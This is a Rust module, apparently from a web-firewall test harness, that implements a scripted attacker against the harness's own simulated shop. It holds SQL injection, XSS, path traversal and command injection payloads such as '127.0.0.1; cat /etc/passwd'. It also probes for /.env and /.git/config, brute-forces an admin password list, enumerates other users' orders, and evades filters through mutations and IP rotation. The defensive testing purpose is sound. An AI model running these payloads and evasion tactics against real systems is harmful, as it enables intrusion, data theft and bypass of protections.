//! The built-in attacker: deterministic for a seed, no LLM, no browser.
//!
//! It browses the home page, optionally probes common paths (recon), then works through
//! one campaign per vulnerability: injections start with a plain payload and, when the
//! gateway blocks it, retry it with mutations (encodings, case, comments, whitespace,
//! quoting, globbing, other separators, parameter pollution, another body format or
//! location). A small bandit learns which mutations get through, per vulnerability class.
//! BOLA is an enumeration of order ids (it keeps reading orders to count leaked records);
//! the brute force walks a short password list. It paces its requests, honours
//! `Retry-After` within a budget, solves proof-of-work challenges when the scenario allows
//! it, rotates client addresses when it has several, and stops when a single-address run
//! finds itself banned.
//!
//! The payloads are written for this harness; none comes from the WAF hold-out lists, and
//! none of the base payloads is a line of them (checked against the pinned lists).

use std::collections::{HashMap, HashSet, VecDeque};
use std::net::IpAddr;
use std::time::Duration;

use super::encode::{Attempt, render};
use super::mutate::{self, Op};
use super::{Observation, Probe, Strategy, Target, USER_AGENT, Verdict, classify, pow, target};
use crate::Vuln;
use crate::app::data;
use crate::rng::Rng;

/// What the attacker can do in a scenario.
#[derive(Debug, Clone)]
pub struct Capabilities {
    /// Client addresses it can use; with `rotate`, a new one per request.
    pub ips: Vec<IpAddr>,
    pub rotate: bool,
    pub solve_pow: bool,
    /// Probe common paths (`/.env`, `/.git/config`, …) before attacking.
    pub recon: bool,
    /// Pause between requests (±25 % jitter).
    pub pace: Duration,
    /// The longest `Retry-After` it waits for, and its total waiting budget.
    pub max_wait: Duration,
    pub wait_budget: Duration,
    /// Attack only these (empty: all, in the order sqli, xss, traversal, cmdi, bola,
    /// bruteforce).
    pub vulns: Vec<Vuln>,
}

const SQLI: &[&str] = &[
    "1 OR 1=1",
    "1 OR 1=1-- -",
    "0 UNION SELECT username,password_hash FROM users",
    "0 UNION SELECT username,password_hash FROM users-- -",
    "1 OR hidden=1",
    "-1 UNION ALL SELECT concat(username,0x3a,password_hash),1 FROM users#",
    "(1)OR(2>1)",
    "1 AND 0 UNION SELECT name,price FROM products WHERE hidden=1",
];

const XSS: &[&str] = &[
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><svg onload=alert(1)>",
    "\" autofocus onfocus=alert(1) x=\"",
    "<details open ontoggle=alert(1)>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<a href=\"javascript:alert(1)\">offers</a>",
];

// (`../` × n + `etc/passwd` is a line of the hold-out lists at every depth, so the plain
// forms here differ from it.)
const TRAVERSAL: &[&str] = &[
    "../../.././etc/passwd",
    "../../../../../../etc//passwd",
    "../../../proc/self/environ",
    "/../../../etc/passwd",
    "./../.././../etc//passwd",
    "../../../etc/./passwd",
];

const CMDI: &[&str] = &[
    "127.0.0.1; id",
    "127.0.0.1 && id",
    "127.0.0.1 | id",
    "$(id)",
    "127.0.0.1`id`",
    "127.0.0.1; cat /etc/passwd",
    "x || whoami",
    "127.0.0.1\nuname -a",
    "127.0.0.1;id #",
];

/// Common passwords, most likely first; the admin's is the 12th.
pub const PASSWORDS: &[&str] = &[
    "123456",
    "password",
    "admin",
    "12345678",
    "qwerty",
    "letmein",
    "welcome1",
    "admin123",
    "Passw0rd",
    "shop2026",
    "Summer2026!",
    "Autumn2026!",
    "iloveyou",
    "monkey123",
    "dragon",
    "sunshine",
    "princess",
    "football",
    "Winter2025!",
    "changeme",
];

const RECON: &[&str] = &[
    "/robots.txt",
    "/.env",
    "/.git/config",
    "/admin/",
    "/wp-login.php",
    "/phpinfo.php",
    "/backup.sql",
    "/server-status",
    "/api/",
    "/sitemap.xml",
];

/// Mutation statistics per class: reward (2 confirmed, 0.5 passed but did nothing, 0
/// stopped) and tries.
#[derive(Default)]
struct Bandit {
    arms: HashMap<(Vuln, Op), (f64, f64)>,
}

impl Bandit {
    fn score(&self, v: Vuln, op: Op) -> f64 {
        let (r, n) = self.arms.get(&(v, op)).copied().unwrap_or((0.0, 0.0));
        op.prior() * (r + 1.0) / (n + 2.0)
    }

    fn update(&mut self, v: Vuln, ops: &[Op], reward: f64) {
        for op in ops {
            let e = self.arms.entry((v, *op)).or_insert((0.0, 0.0));
            e.0 += reward;
            e.1 += 1.0;
        }
    }
}

struct Injection {
    target: &'static Target,
    bases: &'static [&'static str],
    base: usize,
    tries_on_base: usize,
    per_base: usize,
    budget: usize,
    used: usize,
    seen: HashSet<Attempt>,
    last_ops: Vec<Op>,
    done: bool,
}

impl Injection {
    fn new(v: Vuln, bases: &'static [&'static str]) -> Self {
        Injection {
            target: target(v),
            bases,
            base: 0,
            tries_on_base: 0,
            per_base: 8,
            budget: 50,
            used: 0,
            seen: HashSet::new(),
            last_ops: Vec::new(),
            done: false,
        }
    }

    fn next_base(&mut self) {
        self.base += 1;
        self.tries_on_base = 0;
    }

    fn next(&mut self, rng: &mut Rng, bandit: &Bandit) -> Option<Probe> {
        loop {
            if self.done || self.used >= self.budget || self.base >= self.bases.len() {
                return None;
            }
            let plain = Attempt::plain(self.bases[self.base], self.target);
            let (attempt, ops) = if self.tries_on_base == 0 {
                (plain, Vec::new())
            } else {
                match self.mutated(&plain, rng, bandit) {
                    Some(x) => x,
                    None => {
                        self.next_base();
                        continue;
                    }
                }
            };
            self.seen.insert(attempt.clone());
            self.used += 1;
            self.tries_on_base += 1;
            let mut p = render(&attempt, self.target);
            p.label = format!(
                "{}: {:?} [{}{}]",
                self.target.vuln.as_str(),
                attempt.value,
                attempt.delivery.as_str(),
                ops.iter()
                    .flat_map(|o| [", ", o.as_str()])
                    .collect::<String>()
            );
            self.last_ops = ops;
            return Some(p);
        }
    }

    /// A new combination of mutations: one at first, more as the base keeps getting blocked.
    fn mutated(
        &self,
        plain: &Attempt,
        rng: &mut Rng,
        bandit: &Bandit,
    ) -> Option<(Attempt, Vec<Op>)> {
        let v = self.target.vuln;
        let ops: Vec<Op> = mutate::ALL
            .iter()
            .copied()
            .filter(|o| o.applies_to(v))
            .collect();
        let len = (1 + self.tries_on_base / 3).min(4);
        for _ in 0..40 {
            let mut a = plain.clone();
            let mut chain = Vec::new();
            let mut pool = ops.clone();
            while chain.len() < len && !pool.is_empty() {
                let w: Vec<f64> = pool.iter().map(|o| bandit.score(v, *o)).collect();
                let op = pool.remove(rng.weighted(&w));
                if op.apply(&mut a, rng) {
                    chain.push(op);
                    if let Some(g) = op.group() {
                        pool.retain(|o| o.group() != Some(g));
                    }
                }
            }
            if !chain.is_empty() && !self.seen.contains(&a) {
                return Some((a, chain));
            }
        }
        None
    }

    fn feedback(&mut self, verdict: Verdict, bandit: &mut Bandit) {
        let v = self.target.vuln;
        match verdict {
            Verdict::Confirmed => {
                bandit.update(v, &self.last_ops, 2.0);
                self.done = true;
            }
            Verdict::Passed => {
                bandit.update(v, &self.last_ops, 0.5);
                // the plain payload got through and did nothing: it doesn't work here
                if self.last_ops.is_empty() || self.tries_on_base >= self.per_base {
                    self.next_base();
                }
            }
            Verdict::RateLimited(_) => {}
            _ => {
                bandit.update(v, &self.last_ops, 0.0);
                if self.tries_on_base >= self.per_base {
                    self.next_base();
                }
            }
        }
    }
}

struct Bola {
    ids: Vec<i64>,
    idx: usize,
    goal: usize,
    budget: usize,
    harvested: HashSet<i64>,
    stopped_in_a_row: usize,
    done: bool,
}

impl Bola {
    fn new() -> Self {
        // outwards from the attacker's own order
        let mine = 1002;
        let mut ids = Vec::new();
        for d in 1..=60 {
            ids.push(mine + d);
            ids.push(mine - d);
        }
        Bola {
            ids,
            idx: 0,
            goal: 20,
            budget: 40,
            harvested: HashSet::new(),
            stopped_in_a_row: 0,
            done: false,
        }
    }

    fn next(&mut self) -> Option<Probe> {
        if self.done || self.idx >= self.budget.min(self.ids.len()) {
            return None;
        }
        let id = self.ids[self.idx];
        self.idx += 1;
        Some(Probe {
            method: "GET".into(),
            target: format!("/api/orders/{id}"),
            headers: vec![
                ("user-agent".into(), USER_AGENT.into()),
                ("accept".into(), "application/json".into()),
                (
                    "authorization".into(),
                    format!("Bearer {}", data::ATTACKER_TOKEN),
                ),
            ],
            goal: Some(Vuln::Bola),
            label: format!("bola: order {id}"),
            ..Default::default()
        })
    }

    fn feedback(&mut self, verdict: Verdict, obs: &Observation) {
        if let Some(id) = obs.confirmed.as_ref().and_then(|c| c.record) {
            self.harvested.insert(id);
            if self.harvested.len() >= self.goal {
                self.done = true;
            }
        }
        if verdict.stopped() && !matches!(verdict, Verdict::RateLimited(_)) {
            self.stopped_in_a_row += 1;
            if self.stopped_in_a_row >= 6 {
                self.done = true;
            }
        } else {
            self.stopped_in_a_row = 0;
        }
    }
}

struct Brute {
    idx: usize,
    stopped_in_a_row: usize,
    done: bool,
}

impl Brute {
    fn probe(&self) -> Probe {
        let pw = PASSWORDS[self.idx];
        Probe {
            method: "POST".into(),
            target: "/login".into(),
            headers: vec![
                ("user-agent".into(), USER_AGENT.into()),
                ("accept".into(), "application/json".into()),
                (
                    "content-type".into(),
                    "application/x-www-form-urlencoded".into(),
                ),
            ],
            body: format!(
                "username=admin&password={}",
                super::encode::encode(pw, super::encode::Encoding::Minimal)
            )
            .into_bytes(),
            goal: Some(Vuln::BruteForce),
            label: format!("bruteforce: admin / {pw}"),
            ..Default::default()
        }
    }

    fn next(&mut self) -> Option<Probe> {
        if self.done || self.idx >= PASSWORDS.len() {
            return None;
        }
        Some(self.probe())
    }

    fn feedback(&mut self, verdict: Verdict) {
        match verdict {
            Verdict::Confirmed => self.done = true,
            Verdict::Passed => {
                self.idx += 1;
                self.stopped_in_a_row = 0;
            }
            // the same password again once it is allowed through
            Verdict::RateLimited(_) => {}
            _ => {
                self.stopped_in_a_row += 1;
                if self.stopped_in_a_row >= 3 {
                    self.done = true;
                }
            }
        }
    }
}

enum Campaign {
    Recon(usize),
    Injection(Injection),
    Bola(Bola),
    Brute(Brute),
}

#[derive(Clone)]
enum Step {
    Browse,
    Campaign(usize),
    BanCheck,
    PowPage(Box<(Step, Probe)>),
    PowVerify(Box<(Step, Probe)>),
}

pub struct Adaptive {
    caps: Capabilities,
    rng: Rng,
    campaigns: Vec<Campaign>,
    current: usize,
    queue: VecDeque<(Step, Probe)>,
    in_flight: Option<Step>,
    bandit: Bandit,
    cookies: HashMap<IpAddr, String>,
    pow_tries: HashMap<IpAddr, u32>,
    stopped_in_a_row: u32,
    limited_in_a_row: u32,
    challenged_checks: u32,
    challenge_retries: u32,
    waited: Duration,
    stop: Option<String>,
}

impl Adaptive {
    pub fn new(caps: Capabilities, seed: u64) -> Self {
        assert!(!caps.ips.is_empty(), "the attacker needs a client address");
        let mut campaigns = Vec::new();
        if caps.recon {
            campaigns.push(Campaign::Recon(0));
        }
        let wanted = |v: Vuln| caps.vulns.is_empty() || caps.vulns.contains(&v);
        for (v, bases) in [
            (Vuln::Sqli, SQLI),
            (Vuln::Xss, XSS),
            (Vuln::Traversal, TRAVERSAL),
            (Vuln::Cmdi, CMDI),
        ] {
            if wanted(v) {
                campaigns.push(Campaign::Injection(Injection::new(v, bases)));
            }
        }
        if wanted(Vuln::Bola) {
            campaigns.push(Campaign::Bola(Bola::new()));
        }
        if wanted(Vuln::BruteForce) {
            campaigns.push(Campaign::Brute(Brute {
                idx: 0,
                stopped_in_a_row: 0,
                done: false,
            }));
        }
        let home = Probe {
            method: "GET".into(),
            target: "/".into(),
            headers: vec![
                ("user-agent".into(), USER_AGENT.into()),
                ("accept".into(), "text/html,*/*".into()),
            ],
            label: "browse: /".into(),
            ..Default::default()
        };
        Adaptive {
            caps,
            rng: Rng::new(seed),
            campaigns,
            current: 0,
            queue: VecDeque::from([(Step::Browse, home)]),
            in_flight: None,
            bandit: Bandit::default(),
            cookies: HashMap::new(),
            pow_tries: HashMap::new(),
            stopped_in_a_row: 0,
            limited_in_a_row: 0,
            challenged_checks: 0,
            challenge_retries: 0,
            waited: Duration::ZERO,
            stop: None,
        }
    }

    fn pick_ip(&mut self) -> IpAddr {
        if self.caps.rotate {
            *self.rng.pick(&self.caps.ips)
        } else {
            self.caps.ips[0]
        }
    }

    fn pace(&mut self) -> Duration {
        let f = 0.75 + 0.5 * self.rng.unit();
        self.caps.pace.mul_f64(f)
    }

    /// Client address, clearance cookie and pacing.
    fn dress(&mut self, mut p: Probe) -> Probe {
        let ip = match p.client_ip {
            Some(ip) => ip,
            None => self.pick_ip(),
        };
        p.client_ip = Some(ip);
        if let Some(c) = self.cookies.get(&ip) {
            match p.headers.iter_mut().find(|(k, _)| k == "cookie") {
                Some((_, v)) if v.contains(c.as_str()) => {}
                Some((_, v)) => {
                    v.push_str("; ");
                    v.push_str(c);
                }
                None => p.headers.push(("cookie".into(), c.clone())),
            }
        }
        if p.wait.is_zero() {
            p.wait = self.pace();
        }
        p
    }

    fn campaign_next(&mut self) -> Option<(Step, Probe)> {
        while self.current < self.campaigns.len() {
            let i = self.current;
            let p = match &mut self.campaigns[i] {
                Campaign::Recon(k) => RECON.get(*k).map(|path| {
                    *k += 1;
                    Probe {
                        method: "GET".into(),
                        target: (*path).into(),
                        headers: vec![("user-agent".into(), USER_AGENT.into())],
                        label: format!("recon: {path}"),
                        ..Default::default()
                    }
                }),
                Campaign::Injection(c) => c.next(&mut self.rng, &self.bandit),
                Campaign::Bola(c) => c.next(),
                Campaign::Brute(c) => c.next(),
            };
            match p {
                Some(p) => return Some((Step::Campaign(i), p)),
                None => self.current += 1,
            }
        }
        None
    }

    fn feed(&mut self, step: &Step, verdict: Verdict, obs: &Observation) {
        if let Step::Campaign(i) = step {
            match &mut self.campaigns[*i] {
                Campaign::Recon(_) => {}
                Campaign::Injection(c) => c.feedback(verdict, &mut self.bandit),
                Campaign::Bola(c) => c.feedback(verdict, obs),
                Campaign::Brute(c) => c.feedback(verdict),
            }
        }
    }
}

fn with_accept(mut p: Probe, accept: &str) -> Probe {
    p.headers.retain(|(k, _)| k != "accept");
    p.headers.push(("accept".into(), accept.into()));
    p
}

impl Strategy for Adaptive {
    fn name(&self) -> String {
        "adaptive (built-in)".into()
    }

    fn next(&mut self) -> Option<Probe> {
        if self.stop.is_some() {
            return None;
        }
        let (step, probe) = match self.queue.pop_front() {
            Some(x) => x,
            None => match self.campaign_next() {
                Some(x) => x,
                None => {
                    self.stop = Some("done".into());
                    return None;
                }
            },
        };
        let probe = self.dress(probe);
        self.in_flight = Some(step);
        Some(probe)
    }

    fn observe(&mut self, probe: &Probe, obs: &Observation) {
        let Some(step) = self.in_flight.take() else {
            return;
        };
        let mut verdict = classify(obs);
        let ip = probe.client_ip.unwrap_or(self.caps.ips[0]);
        // the request as it was before `dress` added cookies and pacing
        let bare = |p: &Probe| {
            let mut p = p.clone();
            p.wait = Duration::ZERO;
            p
        };
        match step {
            Step::PowPage(orig) => {
                match pow::parse(&obs.body).and_then(|pz| pow::solve(&pz).map(|c| (pz, c))) {
                    Some((pz, c)) => {
                        let verify = Probe {
                            method: "GET".into(),
                            target: pow::verify_target(&pz, c),
                            headers: vec![("user-agent".into(), USER_AGENT.into())],
                            client_ip: Some(ip),
                            label: format!("pow: solved (difficulty {})", pz.difficulty),
                            ..Default::default()
                        };
                        self.queue.push_front((Step::PowVerify(orig), verify));
                    }
                    None => self.queue.push_front(*orig),
                }
                return;
            }
            Step::PowVerify(orig) => {
                if let Some(c) = obs.header("set-cookie").and_then(pow::cookie_pair) {
                    self.cookies.insert(ip, c);
                }
                self.queue.push_front(*orig);
                return;
            }
            Step::BanCheck => {
                match verdict {
                    Verdict::Blocked | Verdict::Refused => {
                        self.stop = Some("locked out (GET / blocked)".into());
                        return;
                    }
                    // solved below like any other challenge
                    Verdict::Challenged if self.caps.solve_pow => {}
                    Verdict::Challenged => {
                        self.challenged_checks += 1;
                        if self.challenged_checks >= 3 {
                            self.stop = Some("stuck behind challenges".into());
                        }
                        return;
                    }
                    _ => {
                        self.challenged_checks = 0;
                        return;
                    }
                }
            }
            Step::Browse | Step::Campaign(_) => {}
        }
        // a challenge: solve it if allowed (at most 3 times per address), then resend
        if verdict == Verdict::Challenged && self.caps.solve_pow {
            let n = self.pow_tries.entry(ip).or_insert(0);
            if *n < 3 {
                *n += 1;
                let mut original = bare(probe);
                // a clearance that no longer works: drop it (the new one is added again)
                if let Some(c) = self.cookies.remove(&ip) {
                    for (k, v) in original.headers.iter_mut() {
                        if k == "cookie" {
                            *v = v.replace(&format!("; {c}"), "").replace(&c, "");
                        }
                    }
                    original
                        .headers
                        .retain(|(k, v)| k != "cookie" || !v.is_empty());
                }
                let mut page = with_accept(original.clone(), "text/html");
                page.label = "pow: fetch the challenge".into();
                self.queue
                    .push_front((Step::PowPage(Box::new((step, original))), page));
                return;
            }
        }
        // with addresses to spare, a challenge is a reason to come back from another one
        if verdict == Verdict::Challenged && self.caps.rotate && !self.caps.solve_pow {
            self.challenge_retries += 1;
            if self.challenge_retries <= 3 {
                let mut again = bare(probe);
                again.client_ip = None;
                self.queue.push_front((step, again));
                return;
            }
        }
        self.challenge_retries = 0;
        if let Verdict::RateLimited(d) = verdict {
            self.limited_in_a_row += 1;
            if self.limited_in_a_row <= 8 {
                let mut again = bare(probe);
                if self.caps.rotate {
                    // another address is cheaper than waiting
                    again.client_ip = None;
                    self.queue.push_front((step, again));
                    return;
                }
                if d <= self.caps.max_wait && self.waited + d <= self.caps.wait_budget {
                    self.waited += d;
                    again.wait = d + Duration::from_millis(50);
                    self.queue.push_front((step, again));
                    return;
                }
            }
            // not worth waiting for: this request is refused
            verdict = Verdict::Refused;
        } else {
            self.limited_in_a_row = 0;
        }
        self.feed(&step, verdict, obs);
        if matches!(
            verdict,
            Verdict::Blocked | Verdict::Refused | Verdict::Challenged
        ) {
            self.stopped_in_a_row += 1;
            // every third refusal in a row: is it the payloads, or is it me?
            if !self.caps.rotate && self.stopped_in_a_row % 3 == 0 {
                let check = Probe {
                    method: "GET".into(),
                    target: "/".into(),
                    headers: vec![("user-agent".into(), USER_AGENT.into())],
                    label: "check: still allowed?".into(),
                    ..Default::default()
                };
                self.queue.push_front((Step::BanCheck, check));
            }
        } else {
            self.stopped_in_a_row = 0;
        }
    }

    fn stop_reason(&self) -> String {
        self.stop.clone().unwrap_or_else(|| "running".into())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::app::fs;

    #[test]
    fn the_admin_password_is_in_the_list() {
        assert_eq!(
            PASSWORDS.iter().position(|p| *p == data::ADMIN_PASSWORD),
            Some(11)
        );
    }

    #[test]
    fn every_class_has_a_base_payload_that_works_on_the_app() {
        assert!(SQLI.iter().any(|p| {
            crate::app::sql::query(&format!(
                "SELECT name, price FROM products WHERE hidden = 0 AND id = {p}"
            ))
            .is_ok_and(|r| r.rows.len() > 3)
        }));
        assert!(
            TRAVERSAL
                .iter()
                .all(|p| fs::read("/", &format!("/srv/app/files/{p}")).is_ok())
        );
        assert!(
            XSS.iter()
                .all(|p| crate::browser::script_runs(&crate::app::search_page(p)).is_some())
        );
    }
}
